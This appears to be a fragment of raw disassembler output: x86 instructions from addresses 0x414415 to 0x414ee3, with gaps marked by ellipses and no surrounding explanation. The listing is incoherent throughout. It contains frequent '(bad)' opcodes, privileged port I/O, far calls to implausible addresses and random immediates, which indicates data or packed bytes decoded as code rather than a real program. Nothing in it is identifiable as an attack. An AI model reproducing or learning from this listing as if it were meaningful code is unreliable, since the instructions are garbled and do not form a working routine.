  414415:	or     BYTE PTR [edx],0x23
  414418:	add    BYTE PTR [eax+0xce75b51],al
  41441e:	jle    0x4143c7
  414420:	es aam 0x78
  414423:	test   al,0xef
  414425:	imul   ecx,DWORD PTR ds:0x703e76a,0x5e
  41442c:	test   al,0x8b
  41442e:	mov    DWORD PTR [esi],esi
  414430:	adc    al,BYTE PTR [ecx+edx*1+0x78283450]
  414437:	pop    ebx
  414438:	out    0xd2,eax
  41443a:	popa   
  41443b:	(bad)  
  41443c:	test   BYTE PTR [ebx],0x3e
  41443f:	push   esi
  414440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414441:	clc    
  414442:	push   edx
  414443:	mov    esi,DWORD PTR [edi]
  414445:	ins    BYTE PTR es:[edi],dx
  414446:	stos   BYTE PTR es:[edi],al
  414447:	(bad)  
  414448:	xchg   esi,eax
  414449:	jg     0x414401
  41444b:	xchg   edi,eax
  41444c:	xchg   ebx,eax
  41444d:	fisttp QWORD PTR [esi+0x6c77fd22]
  414453:	xor    ebx,DWORD PTR [esi-0x30]
  414456:	adc    BYTE PTR [edx],ah
  414458:	add    DWORD PTR [edx+0x0],eax
	...
  414482:	add    BYTE PTR [eax],al
  414484:	inc    eax
  414485:	fwait
  414486:	xor    BYTE PTR [ecx+0x66cfa83d],0xf7
  41448d:	sub    ecx,ebp
  41448f:	test   eax,0x62fe2101
  414494:	imul   DWORD PTR ds:0x567c205a
  41449a:	add    BYTE PTR [esp+eax*8+0x76258235],bl
  4144a1:	mov    BYTE PTR [ebp+0x6a],dl
  4144a4:	jg     0x414498
  4144a6:	dec    ecx
  4144a7:	test   al,0x3d
  4144a9:	pop    ebx
  4144aa:	jae    0x41449b
  4144ac:	cwde   
  4144ad:	jg     0x414476
  4144af:	sub    ecx,DWORD PTR [esi+0x5b]
  4144b2:	mov    ebp,DWORD PTR [ebp+ebp*1+0x3194fd92]
  4144b9:	xor    edi,DWORD PTR [eax+0xa211898]
  4144bf:	sub    DWORD PTR [ecx-0x29],eax
  4144c2:	sub    ebp,eax
  4144c4:	cmp    eax,0x16c7f5b
  4144c9:	and    bh,dh
  4144cb:	stc    
  4144cc:	cmp    eax,0x3af68152
  4144d1:	pop    ebx
  4144d2:	add    dh,dl
  4144d4:	and    ax,0x54fe
  4144d8:	loop   0x414513
  4144da:	inc    ebp
  4144db:	sbb    al,0xd9
  4144dd:	and    BYTE PTR [edx],cl
  4144df:	test   eax,0xe804d840
  4144e4:	cmp    eax,0x34fd5b
	...
  414511:	add    BYTE PTR [esi+0x25a17420],bh
  414517:	loopne 0x41457e
  414519:	sub    BYTE PTR [edx],bh
  41451b:	xor    edx,edx
  41451d:	xchg   edi,eax
  41451e:	test   al,0x21
  414520:	mov    BYTE PTR [esi+ebp*4],ah
  414523:	and    DWORD PTR [eax+eax*1-0x3d],esi
  414527:	mov    eax,ds:0xf12ff874
  41452c:	inc    cx
  41452e:	pop    ss
  41452f:	mov    ch,0xbd
  414531:	(bad)  
  414532:	nop
  414533:	mov    eax,ds:0xa18f4588
  414538:	je     0x414536
  41453a:	nop
  41453b:	and    esi,esi
  41453d:	push   0x41391e
  414542:	jg     0x41452f
  414544:	sti    
  414545:	inc    DWORD PTR [eax+0x64e444cf]
  41454b:	pop    ebx
  41454c:	in     al,dx
  41454d:	add    al,ah
  41454f:	fsubr  DWORD PTR [eax-0x7ea32900]
  414555:	jge    0x4145a6
  414557:	pop    esp
  414558:	or     eax,0x5c3084
  41455d:	add    BYTE PTR [ebx+ebx*2],dl
  414560:	in     al,0x0
  414562:	sbb    al,0x94
  414565:	add    BYTE PTR [edi+0x2f75fd5c],ah
  41456b:	mov    ah,0x61
  41456d:	ss xchg edi,eax
  41456f:	pop    esp
  414570:	mov    DWORD PTR [ebp+0x3f],esi
  414573:	aad    0xfb
  414575:	mov    eax,DWORD PTR [eax]
	...
  41459f:	add    BYTE PTR [edi-0x73ae1774],ch
  4145a5:	jno    0x41460d
  4145a7:	lods   eax,DWORD PTR ds:[esi]
  4145a8:	push   ebx
  4145a9:	addr16 jb 0x4145b4
  4145ac:	xor    esp,DWORD PTR [ebp+esi*2+0x4]
  4145b0:	xor    esp,DWORD PTR [edi-0x17]
  4145b3:	add    al,0x43
  4145b5:	sbb    al,0x2
  4145b7:	or     dl,bh
  4145b9:	fisubr DWORD PTR ds:0xf9dc5d72
  4145bf:	cmp    DWORD PTR [eax+0x58],ebx
  4145c2:	sub    ah,0x17
  4145c5:	mov    bl,0x3
  4145c7:	cmp    BYTE PTR [esi],0xd6
  4145ca:	sar    DWORD PTR [edi-0x6],0x3b
  4145ce:	inc    edx
  4145cf:	fild   WORD PTR [edx+0x2c]
  4145d2:	inc    esi
  4145d3:	test   eax,0x744b2d87
  4145d8:	clc    
  4145d9:	dec    edx
  4145da:	mov    DWORD PTR [edx+eiz*8-0x50],ecx
  4145de:	cmc    
  4145df:	out    0xc9,eax
  4145e1:	out    dx,al
  4145e2:	popa   
  4145e3:	(bad)  
  4145e4:	jnp    0x414580
  4145e6:	add    al,0x0
  4145e8:	xor    cl,BYTE PTR ds:[edi-0x181df5bc]
  4145ef:	add    BYTE PTR [edx+esi*1-0x18],ah
  4145f3:	jmp    DWORD PTR [edi+0x32]
  4145f6:	call   0x5e3000fa
  4145fb:	dec    edi
  4145fc:	rol    DWORD PTR [esi],0xad
  4145ff:	dec    edx
  414600:	push   DWORD PTR [ecx]
  414602:	or     eax,eax
	...
  41462c:	add    BYTE PTR [eax],al
  41462e:	sub    dl,BYTE PTR [ecx+eax*4]
  414631:	jl     0x4145b9
  414633:	xor    esi,esi
  414635:	sbb    esp,DWORD PTR [ecx+0x13fe55c6]
  41463b:	jp     0x4146b8
  41463d:	je     0x4145d9
  41463f:	and    bh,dh
  414641:	jmp    0x4145cc
  414643:	sahf   
  414644:	or     eax,ebp
  414646:	ret    
  414647:	sub    eax,0x7e79fe7d
  41464c:	pop    esp
  41464d:	out    0x67,eax
  41464f:	inc    esi
  414650:	add    al,0x0
  414652:	imul   edi,DWORD PTR [esi+0x70],0x7b7b67e7
  414659:	(bad)  
  41465a:	pop    ecx
  41465b:	pop    esi
  41465c:	ins    BYTE PTR es:[edi],dx
  41465d:	out    0x4f,eax
  41465f:	imul   edi,DWORD PTR [ebx-0x2],0x49
  414663:	pop    esi
  414664:	push   0x7b7b57e7
  414669:	dec    bl
  41466b:	pop    ebx
  41466c:	sub    al,0x74
  41466e:	xor    DWORD PTR [ebx],0x1f28d300
  414674:	aaa    
  414675:	fdivrp st(6),st
  414677:	sbb    esp,ebx
  414679:	add    esi,DWORD PTR [ebx-0x2e]
  41467c:	xchg   ebx,eax
  41467d:	cmp    ch,0x1f
  414680:	adc    al,BYTE PTR [esp+edx*4]
  414683:	cwde   
  414684:	jbe    0x41467c
  414686:	cmp    DWORD PTR [ebx],esi
  414688:	call   0x71603f58
  41468d:	(bad)  
  41468e:	cmc    
  41468f:	push   ds
  414690:	aad    0xb
	...
  4146ba:	add    BYTE PTR [eax],al
  4146bc:	(bad)  
  4146bd:	jns    0x414713
  4146bf:	jl     0x4146a1
  4146c1:	mov    cl,0xe4
  4146c3:	imul   ecx,DWORD PTR [ebx-0x72],0x46
  4146c7:	jl     0x41470d
  4146c9:	sbb    esi,DWORD PTR [ebp+ebx*1+0x4fbfb36e]
  4146d0:	add    DWORD PTR [ebx-0x41],ebx
  4146d3:	add    edi,DWORD PTR [esi]
  4146d5:	cs data16 jmp 0x4146a9
  4146d9:	mov    dh,0xa8
  4146db:	add    ecx,DWORD PTR [esi]
  4146dd:	push   ds
  4146de:	popf   
  4146df:	or     edx,DWORD PTR [esi-0x678366c5]
  4146e5:	xor    ebx,DWORD PTR [ecx+ecx*8-0x70]
  4146e9:	push   ds
  4146ea:	push   ebp
  4146ec:	test   DWORD PTR [esi],ebx
  4146ee:	jge    0x4146fb
  4146f0:	xchg   esi,eax
  4146f1:	push   esi
  4146f2:	lahf   
  4146f3:	jl     0x41476d
  4146f5:	adc    al,0xaa
  4146f7:	add    BYTE PTR [esi],bh
  4146f9:	mov    BYTE PTR [edx+0x68],dh
  4146fc:	mov    esp,0xd7d3d417
  414701:	pop    edx
  414702:	inc    ecx
  414703:	ret    0xa858
  414706:	out    dx,eax
  414707:	imul   esp,DWORD PTR [edi-0x4984416a],0xffffff98
  41470e:	add    BYTE PTR [ebp+0x21575fb1],dh
  414714:	add    ebx,DWORD PTR [esi]
  414716:	jle    0x4146fe
  414718:	cmp    eax,0x96114fa7
  41471d:	mov    ch,0x3f
  41471f:	jmp    0x414724
	...
  414748:	add    BYTE PTR [eax],al
  41474a:	or     al,0x36
  41474c:	int3   
  41474d:	xlat   BYTE PTR ds:[ebx]
  41474e:	cmp    eax,0xea9095b
  414753:	pop    esp
  414754:	jmp    0x667b5d47
  414759:	sub    BYTE PTR [edx],bh
  41475b:	xchg   al,ch
  41475d:	sub    eax,0xf2005b2c
  414762:	jge    0x41470e
  414764:	and    DWORD PTR [esi+0x56544e55],esi
  41476a:	gs push ecx
  41476c:	rcl    ch,0x3a
  41476f:	mov    ebp,DWORD PTR [eax-0x17]
  414772:	cmp    eax,0x50d1bf2e
  414777:	mov    ch,0x3f
  414779:	jmp    0xe1b5646b
  41477e:	and    eax,0x35267146
  414783:	and    BYTE PTR ss:[ebx-0x2502e2dc],dh
  41478a:	std    
  41478b:	loop   0x41478a
  41478d:	push   cs
  41478e:	adc    eax,0x5257f31d
  414793:	push   esi
  414794:	jae    0x4147e4
  414796:	add    eax,0x8ef6fca7
  41479b:	push   ebp
  41479c:	call   0xfe5dc508
  4147a1:	inc    esi
  4147a2:	add    ebx,DWORD PTR [eax*1-0x132f7117]
  4147a9:	push   0xcef60e21
	...
  4147d6:	add    BYTE PTR [eax],al
  4147d8:	aam    0xce
  4147da:	inc    ebx
  4147db:	add    BYTE PTR [ebx+0x9],bh
  4147de:	push   DWORD PTR [ebp+0x67]
  4147e1:	mov    al,ds:0x427f0c74
  4147e6:	add    BYTE PTR ss:[edi],ah
  4147e9:	dec    esi
  4147ea:	ror    BYTE PTR [edi],0xa2
  4147ed:	imul   eax,DWORD PTR [edx],0x0
  4147f0:	pop    ss
  4147f1:	call   0x0:0x5917f844
  4147f8:	loopne 0x414815
  4147fa:	out    dx,al
  4147fb:	jmp    DWORD PTR [eax]
  4147fd:	pop    ecx
  4147fe:	add    BYTE PTR [edx+0x17],ch
  414801:	das    
  414802:	(bad)  
  414803:	imul   edx,DWORD PTR [edi],0x228cfe2f
  414809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41480a:	dec    ebp
  41480b:	lea    esp,[edx-0x58]
  41480e:	idiv   bh
  414810:	mov    BYTE PTR [eax],cl
  414812:	push   DWORD PTR [ebp-0x71]
  414815:	mov    eax,ds:0xb17ffc74
  41481a:	xor    al,0x0
  41481c:	out    0x4d,eax
  41481e:	shl    BYTE PTR [edx+eiz*8-0x51],0xf5
  414823:	add    edi,edx
  414825:	pop    eax
  414826:	push   0xfe17dfb1
  41482b:	(bad)  
  41482c:	ror    BYTE PTR [eax-0x18],cl
  41482f:	inc    eax
  414830:	fisub  DWORD PTR [ecx-0x77e3af02]
  414836:	mov    WORD PTR [ebp-0x156c9],es
	...
  414864:	add    BYTE PTR [eax],al
  414866:	mov    bh,0x6
  414868:	out    0x30,al
  41486a:	fisub  DWORD PTR [ecx-0x4bed7602]
  414870:	idiv   bh
  414872:	push   0x584983b1
  414877:	mov    ds:0x793458c,al
  41487c:	push   cx
  41487e:	ds call 0xf668:0xc758ffc1
  414886:	push   ecx
  414887:	adc    eax,0xa3a7478
  41488c:	or     BYTE PTR [ebx+0x41],0xe5
  414890:	mov    DWORD PTR [esi+edx*1-0x5b01881b],eax
  414897:	xor    ch,dl
  414899:	pop    ecx
  41489a:	xchg   esi,eax
  41489b:	jae    0x4148a1
  41489d:	(bad)  
  41489e:	jmp    0x414875
  4148a0:	outs   dx,DWORD PTR ds:[esi]
  4148a1:	(bad)  
  4148a2:	sbb    ebp,ecx
  4148a4:	in     eax,dx
  4148a5:	or     esp,DWORD PTR [esi]
  4148a7:	inc    esi
  4148a8:	enter  0x9fe,0xab
  4148ac:	jge    0x414895
  4148ae:	or     DWORD PTR [ebp+0x5a3e6977],esp
  4148b4:	frstor [edi+0x7f]
  4148b7:	xor    bh,BYTE PTR [ecx-0x4c]
  4148ba:	fiadd  DWORD PTR [edi+esi*2+0x5fee1fe]
  4148c1:	call   0xfeba0735
  4148c6:	(bad)  
  4148c7:	scas   al,BYTE PTR es:[edi]
  4148c8:	pusha  
  4148c9:	test   BYTE PTR [eax],0x0
	...
  4148f4:	leave  
  4148f5:	pop    esp
  4148f6:	test   DWORD PTR [edx+ebp*8+0xefe775c],eax
  4148fd:	sbb    dh,bh
  4148ff:	push   DWORD PTR [bx+di]
  414902:	jns    0x4148b8
  414904:	call   0x5be:0xa1fe7744
  41490b:	call   0xfeba075f
  414910:	inc    ebp
  414911:	jb     0x414903
  414913:	sbb    BYTE PTR [ebp-0x7e09afa2],bh
  414919:	and    al,0xfe
  41491b:	je     0x41496b
  41491d:	sub    eax,0x5abb8f32
  414922:	(bad)  
  414923:	jo     0x41498d
  414925:	sbb    edi,DWORD PTR [eax]
  414927:	ins    BYTE PTR es:[edi],dx
  414928:	arpl   WORD PTR [edx+0x466478d6],dx
  41492e:	loop   0x414973
  414930:	int    0x54
  414932:	pop    ss
  414933:	ins    BYTE PTR es:[edi],dx
  414934:	dec    edi
  414935:	xchg   edx,eax
  414936:	mov    esi,0xc7d57878
  41493b:	jo     0x414975
  41493d:	sbb    edx,ebp
  41493f:	add    edi,DWORD PTR [esi]
  414941:	pop    ebx
  414942:	adc    DWORD PTR [esi+edx*4],eax
  414945:	xchg   DWORD PTR [edi],ecx
  414947:	ret    
  414948:	and    DWORD PTR [edx],ebx
  41494a:	pop    ebp
  41494b:	adc    BYTE PTR [bp+di],bl
  41494e:	(bad)  
  41494f:	js     0x4148db
  414951:	addr16 (bad) 
  414953:	ins    BYTE PTR es:[edi],dx
  414954:	je     0x414970
  414956:	jg     0x4148e2
	...
  414980:	add    BYTE PTR [eax],al
  414982:	mov    edx,0xf8787f37
  414987:	test   edi,esp
  414989:	jmp    0x414944
  41498b:	sub    DWORD PTR [eax+0x4bd0e903],0x70
  414992:	loopne 0x4149ae
  414994:	push   edi
  414995:	out    dx,al
  414996:	inc    ebp
  414997:	add    edi,DWORD PTR [eax]
  414999:	int3   
  41499a:	rcr    BYTE PTR [edx],1
  41499c:	jno    0x414a1c
  41499e:	stc    
  41499f:	adc    bh,BYTE PTR [edi]
  4149a1:	js     0x41495f
  4149a3:	fmul   DWORD PTR [edi]
  4149a5:	jo     0x41495f
  4149a7:	sbb    ch,al
  4149a9:	or     BYTE PTR [edx+0x3e03e7ef],bh
  4149af:	cmp    DWORD PTR [edx-0x15],0xfffffffe
  4149b3:	pop    edx
  4149b4:	fs mov esi,0xae0eab8d
  4149ba:	imul   edx,DWORD PTR [edx],0x69a17807
  4149c0:	jns    0x414a3a
  4149c2:	and    BYTE PTR [esi+0x0],0x29
  4149c6:	imul   edx,DWORD PTR [esi+0x19e16c81],0xd7bd5f72
  4149d0:	in     al,0xd6
  4149d2:	jmp    0x679e4aef
  4149d7:	fnstsw WORD PTR [ebx-0x1e71e3f]
  4149dd:	jmp    0xd9a9c83b
  4149e2:	cmp    eax,0xb6bf0a
	...
  414a0f:	add    BYTE PTR [edi],ch
  414a11:	(bad)  
  414a12:	call   0xfe5a48e7
  414a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a18:	out    dx,eax
  414a19:	add    esi,esi
  414a1b:	sahf   
  414a1c:	test   eax,0xa5e17419
  414a21:	xchg   DWORD PTR [ebx-0x72],eax
  414a24:	mov    DWORD PTR [ecx],ebx
  414a26:	mov    ah,0x8d
  414a28:	cdq    
  414a29:	sbb    esi,edi
  414a2b:	jle    0x414a3c
  414a2d:	(bad)  
  414a2e:	call   0xfe5a4949
  414a33:	outs   dx,BYTE PTR ds:[esi]
  414a34:	out    dx,eax
  414a35:	or     eax,0x118a9cfe
  414a3a:	(bad)  
  414a3b:	pop    esi
  414a3c:	imul   ecx,DWORD PTR [edi-0x5fe3bef8],0xcf494efd
  414a46:	loopne 0x414a86
  414a48:	push   ecx
  414a49:	sbb    esi,edi
  414a4b:	mov    ah,0x35
  414a4d:	add    ebx,edi
  414a4f:	lods   eax,DWORD PTR ds:[esi]
  414a50:	xor    BYTE PTR [ecx],bl
  414a52:	(bad)  
  414a53:	je     0x414a6b
  414a55:	adc    esi,edi
  414a57:	xor    DWORD PTR es:[edi-0x5f93eef8],ecx
  414a5e:	std    
  414a5f:	push   ss
  414a60:	adc    edi,ecx
  414a62:	rcl    BYTE PTR [esi],1
  414a64:	or     DWORD PTR [ecx],ebx
  414a66:	inc    BYTE PTR [eax]
  414a68:	or     ah,BYTE PTR [esi-0x18]
  414a6b:	and    al,0xda
  414a6d:	nop
  414a6e:	(bad)  
  414a6f:	(bad)  
  414a70:	cmp    dh,BYTE PTR [edi+0xfff6]
	...
  414a9e:	pusha  
  414a9f:	test   DWORD PTR [ebx],eax
  414aa1:	dec    eax
  414aa2:	pusha  
  414aa3:	nop
  414aa4:	(bad)  
  414aa5:	mov    ch,0x8f
  414aa7:	mov    dh,bh
  414aa9:	(bad)  
  414aaa:	jg     0x414a40
  414aac:	inc    esi
  414aad:	inc    DWORD PTR [eax-0x77234b70]
  414ab3:	nop
  414ab4:	(bad)  
  414ab5:	call   0x402341
  414aba:	lock retf 
  414abc:	loope  0x414ab5
  414abe:	loopne 0x414a51
  414ac0:	in     eax,0xe5
  414ac2:	pop    eax
  414ac3:	nop
  414ac4:	(bad)  
  414ac5:	dec    DWORD PTR [edx-0x4f000954]
  414acb:	test   bh,dl
  414acd:	inc    edi
  414ace:	rcl    BYTE PTR [ecx-0x764c4a02],0xfe
  414ad5:	inc    DWORD PTR [eax-0x500f5f5]
  414adb:	fs call 0xfed2ada7
  414ae1:	dec    edx
  414ae3:	xor    dh,0xff
  414ae6:	add    BYTE PTR [ebx+edi*4-0x16e8fb9],0x45
  414aee:	outs   dx,DWORD PTR ds:[esi]
  414aef:	xchg   edi,edx
  414af1:	std    
  414af2:	adc    BYTE PTR [ecx-0x7bfc8a02],0xd7
  414af9:	xor    esp,DWORD PTR [edi-0x6c3d38a4]
  414aff:	pop    esp
  414b00:	push   ebx
  414b01:	mov    eax,DWORD PTR [eax]
	...
  414b2b:	add    BYTE PTR [ebx-0x23],dl
  414b2e:	shl    esp,0x12
  414b31:	sbb    edi,edx
  414b33:	push   eax
  414b34:	fidiv  DWORD PTR ds:0xea01ff68
  414b3b:	cld    
  414b3c:	and    ebx,eax
  414b3e:	add    edi,edi
  414b40:	or     eax,DWORD PTR [esi]
  414b42:	push   0xffffffa5
  414b44:	add    al,0x11
  414b46:	je     0x414b52
  414b48:	jle    0x414ad8
  414b4a:	jmp    0xeb03:0x787fbd4f
  414b51:	pop    eax
  414b52:	jae    0x414b83
  414b54:	leave  
  414b55:	inc    edi
  414b56:	jl     0x414ad8
  414b58:	shr    DWORD PTR [ecx],cl
  414b5a:	jno    0x414b5c
  414b5c:	ds add ch,ah
  414b5f:	push   es
  414b60:	jns    0x414ba1
  414b62:	jl     0x414b57
  414b64:	aas    
  414b65:	add    al,BYTE PTR [edx]
  414b67:	jmp    0x414be5
  414b69:	leave  
  414b6a:	in     eax,dx
  414b6b:	not    DWORD PTR [esi+0x3e40ec48]
  414b71:	xchg   DWORD PTR [ebp-0x1225911d],edi
  414b77:	xor    bh,BYTE PTR [esi]
  414b79:	add    al,BYTE PTR [ecx+0x46c3ac3]
  414b7f:	lea    edi,[ebx-0x22]
  414b82:	aam    0x67
  414b84:	sti    
  414b85:	push   0xef0ffc1
  414b8a:	push   es
  414b8b:	call   0xfeb6181b
	...
  414bb8:	add    BYTE PTR [eax],al
  414bba:	xor    eax,0x6e13f042
  414bbf:	sbb    al,BYTE PTR [ebx]
  414bc1:	add    cl,ah
  414bc3:	out    0xd4,eax
  414bc5:	(bad)  
  414bc6:	push   ebx
  414bc7:	or     ch,BYTE PTR [edx+0x3e]
  414bca:	push   ebx
  414bcb:	pop    ecx
  414bcc:	jae    0x414bb5
  414bce:	imul   ecx,ecx,0x74
  414bd1:	(bad)  
  414bd2:	mov    cl,0xf6
  414bd4:	jns    0x414b58
  414bd6:	sub    ebx,DWORD PTR [ebx+0x1f]
  414bd9:	add    al,0x2b
  414bdb:	ror    DWORD PTR [edi],cl
  414bdd:	adc    eax,0x4b171801
  414be2:	jg     0x414c46
  414be4:	out    0xce,eax
  414be6:	mov    ah,0x6
  414be8:	imul   eax,DWORD PTR [eax-0x7b],0xffffff84
  414bec:	out    0xe9,eax
  414bee:	add    BYTE PTR [eax],bl
  414bf0:	jge    0x414bfd
  414bf2:	cwd    
  414bf4:	mov    ds:0x2ce16874,eax
  414bf9:	js     0x414bd4
  414bfb:	jae    0x414c4c
  414bfd:	ret    
  414bfe:	pop    ecx
  414bff:	sbb    BYTE PTR ds:0xe799f94f,bl
  414c05:	je     0x414bd9
  414c07:	(bad)  
  414c08:	iret   
  414c09:	jae    0x414c50
  414c0b:	pop    ss
  414c0c:	mov    edi,0x288354eb
  414c11:	add    al,0xa6
  414c13:	pop    ecx
  414c14:	out    0x3,eax
  414c16:	mov    esi,0x160c1d16
  414c1b:	ss pushf 
  414c1d:	je     0x414c1f
	...
  414c47:	add    BYTE PTR [eax],bl
  414c49:	pop    ss
  414c4a:	fisttp QWORD PTR [esi+0x79]
  414c4d:	pushf  
  414c4e:	out    0x74,eax
  414c50:	xchg   edx,eax
  414c51:	arpl   WORD PTR [edi+0x7f17012a],cx
  414c57:	jmp    0x414c98
  414c59:	pop    ebx
  414c5a:	out    0x83,eax
  414c5c:	lock nop
  414c5e:	fild   QWORD PTR [ebx+0x45]
  414c61:	push   ss
  414c62:	addr16 je 0x414c45
  414c65:	nop
  414c66:	pop    ebx
  414c67:	je     0x414cbb
  414c69:	arpl   WORD PTR [edi],di
  414c6b:	cmp    bh,BYTE PTR [edx+0x16]
  414c6e:	dec    edi
  414c6f:	dec    edx
  414c70:	call   FWORD PTR [edi-0x19]
  414c73:	into   
  414c74:	mov    ah,0x7
  414c76:	imul   edi,DWORD PTR [edi],0xffffff95
  414c79:	lods   eax,DWORD PTR ds:[esi]
  414c7a:	add    BYTE PTR [esi-0x5e97e959],bl
  414c80:	xor    cl,BYTE PTR [edi-0x66f9eef8]
  414c86:	std    
  414c87:	push   ds
  414c88:	les    ebx,FWORD PTR [edi-0x35b79504]
  414c8e:	dec    ecx
  414c8f:	test   al,0x3d
  414c91:	pop    ebx
  414c92:	or     eax,0x5af86d
  414c97:	jmp    0xa2f6a45a
  414c9c:	jl     0x414cb4
  414c9e:	(bad)  
  414c9f:	fsubp  st(1),st
  414ca1:	aad    0xff
  414ca3:	call   0x9e7d26e5
  414ca8:	cdq    
  414ca9:	fwait
  414caa:	add    cl,ch
	...
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	cmp    al,0xdf
  414cd8:	mov    cl,0xe8
  414cda:	cmp    eax,0x4d04815b
  414cdf:	mov    eax,ds:0x663de93f
  414ce4:	test   BYTE PTR [edi+0x6a005b3b],cl
  414cea:	outs   dx,DWORD PTR ds:[esi]
  414ceb:	fimul  DWORD PTR [ecx+0x28]
  414cee:	cmp    bl,BYTE PTR [ebx+0xd]
  414cf1:	gs retf 
  414cf3:	pop    edx
  414cf4:	add    cl,ch
  414cf6:	mov    eax,0x3228556
  414cfb:	push   ss
  414cfc:	(bad)  
  414cfd:	idiv   BYTE PTR [ecx+0x3de8ffe1]
  414d03:	fidivr DWORD PTR [ebx]
  414d05:	bound  esi,QWORD PTR [ecx+0x3ce9009a]
  414d0b:	fistp  QWORD PTR [ebp-0x18]
  414d0e:	cmp    eax,0xa91c815b
  414d13:	mov    al,ds:0x663de93f
  414d18:	test   bl,bl
  414d1a:	inc    edx
  414d1b:	pop    ebx
  414d1c:	add    BYTE PTR [eax],al
  414d1e:	out    dx,eax
  414d1f:	hlt    
  414d20:	gs inc ecx
  414d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d23:	aaa    
  414d24:	(bad)  
  414d25:	(bad)  
  414d26:	xchg   edx,eax
  414d27:	int3   
  414d28:	dec    edx
  414d29:	inc    ecx
  414d2a:	xchg   edi,eax
  414d2b:	xchg   esi,eax
  414d2c:	inc    esp
  414d2d:	clc    
  414d2e:	adc    al,0xc
  414d30:	test   BYTE PTR [eax],0xa8
  414d33:	fst    QWORD PTR [ebp+0x1]
  414d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d37:	pop    ecx
  414d38:	sub    esi,esi
	...
  414d62:	add    BYTE PTR [eax],al
  414d64:	ror    DWORD PTR [eax+0x7438f874],1
  414d6a:	mov    ch,0x4b
  414d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d6d:	pop    ecx
  414d6e:	mov    eax,esi
  414d70:	pop    esp
  414d71:	xchg   ebx,eax
  414d72:	je     0x414d79
  414d74:	ds push ecx
  414d76:	(bad)  
  414d77:	call   DWORD PTR [edi-0x6c]
  414d7a:	push   ebx
  414d7b:	or     al,0xcc
  414d7d:	xlat   BYTE PTR ds:[ebx]
  414d7e:	gs mov ebp,ebp
  414d81:	cli    
  414d82:	mov    BYTE PTR [ebp+0x73],cl
  414d85:	adc    al,0xff
  414d87:	psrlq  mm5,QWORD PTR [edx-0x1]
  414d8b:	jmp    DWORD PTR [edi]
  414d8d:	mov    eax,0x5927010b
  414d92:	push   0xfe1e7fae
  414d97:	inc    BYTE PTR [eax]
  414d99:	mov    cl,0x33
  414d9b:	xor    DWORD PTR [edi],esp
  414d9d:	pop    ecx
  414d9e:	or     eax,eax
  414da0:	sbb    ah,ah
  414da2:	icebp  
  414da3:	add    BYTE PTR [edi],dl
  414da5:	pop    ecx
  414da6:	cmp    DWORD PTR [edi+0xf],0xcd840d59
  414dad:	pop    eax
  414dae:	add    BYTE PTR [eax],al
  414db0:	push   0xb8e80611
  414db5:	and    edi,edi
  414db7:	jmp    FWORD PTR [esi+0x23]
  414dba:	out    dx,al
  414dbb:	push   eax
  414dbd:	adc    bh,bh
  414dbf:	jne    0x414dff
  414dc1:	mov    dl,0x72
  414dc3:	jbe    0x414dff
  414dc5:	call   0x0:0x4608
	...
  414df0:	add    BYTE PTR [eax],al
  414df2:	rcr    DWORD PTR [ebp-0x3cd94827],0x1
  414df9:	jmp    FWORD PTR [ebx]
  414dfb:	push   edx
  414dfc:	pop    ecx
  414dfd:	std    
  414dfe:	outs   dx,BYTE PTR ds:[esi]
  414dff:	add    al,BYTE PTR [edx]
  414e01:	or     edi,DWORD PTR [esi+0xd]
  414e04:	mov    DWORD PTR [ebx+0x6a02023e],esi
  414e0a:	ds jg  0x414dd5
  414e0d:	out    0xee,eax
  414e0f:	mov    dh,0xc8
  414e11:	jmp    0x414e01
  414e13:	out    0x1,eax
  414e15:	push   0x3e
  414e17:	in     al,dx
  414e18:	jb     0x414e2e
  414e1a:	mov    cl,0xb9
  414e1c:	(bad)  
  414e1d:	push   DWORD PTR [edx+eax*2]
  414e20:	add    al,BYTE PTR [ecx+ecx*8-0x34fffdfe]
  414e27:	aas    
  414e28:	push   0x5cb7514f
  414e2d:	(bad)  
  414e2e:	rcl    ebp,cl
  414e30:	outs   dx,DWORD PTR ds:[esi]
  414e31:	adc    al,0xc1
  414e33:	dec    eax
  414e34:	sar    edi,0x44
  414e37:	ret    0x77f8
  414e3a:	ret    
  414e3b:	inc    esi
  414e3c:	fs dec edi
  414e3e:	xchg   esp,eax
  414e3f:	add    bl,ah
  414e41:	call   DWORD PTR [edi+0x18ffdc05]
  414e47:	outs   dx,DWORD PTR ds:[esi]
  414e48:	push   0xbb812bfe
  414e4d:	inc    eax
  414e4e:	ds stc 
  414e50:	inc    ecx
  414e51:	jae    0x414ebb
  414e53:	(bad)  
  414e55:	fild   WORD PTR [eax]
	...
  414e7f:	add    dh,ah
  414e81:	pop    esp
  414e82:	(bad)  
  414e85:	jp     0x414e4c
  414e87:	fstp   TBYTE PTR [ebx-0x1eb09bc2]
  414e8d:	pop    edx
  414e8e:	fmul   QWORD PTR [edi+0x67]
  414e91:	pop    ebx
  414e92:	ror    DWORD PTR [eax],1
  414e94:	fs pop ebx
  414e96:	push   esi
  414e97:	neg    ebp
  414e99:	adc    esi,ebp
  414e9b:	test   BYTE PTR [edx+ebx*4-0x19],dh
  414e9f:	cld    
  414ea0:	stc    
  414ea1:	mov    ss,WORD PTR [eax]
  414ea3:	fdiv   QWORD PTR [ecx-0x574db8ed]
  414ea9:	(bad)  
  414eaa:	fistp  WORD PTR [ebx-0x78]
  414ead:	cdq    
  414eae:	es jno 0x414e49
  414eb1:	mov    edi,gs
  414eb3:	jo     0x414ec0
  414eb5:	pop    edi
  414eb6:	push   ss
  414eb7:	test   DWORD PTR [ecx+0x3],0x1380c30f
  414ebe:	pop    es
  414ebf:	neg    DWORD PTR [ecx+0x704f7513]
  414ec5:	(bad)  
  414ec6:	fistp  WORD PTR [ebx+0x6e]
  414ec9:	cdq    
  414eca:	out    dx,al
  414ecb:	jo     0x414f2d
  414ecd:	(bad)  
  414ece:	ret    
  414ecf:	pop    ebx
  414ed0:	aas    
  414ed1:	sahf   
  414ed2:	fidiv  WORD PTR [eax+0x50]
  414ed5:	(bad)  
  414ed6:	retf   
  414ed7:	jo     0x414f0b
  414ed9:	fsub   QWORD PTR [edx]
  414edb:	ret    
  414edc:	inc    ecx
  414edd:	and    edi,0xbeffb270
  414ee3:	push   ss
	...
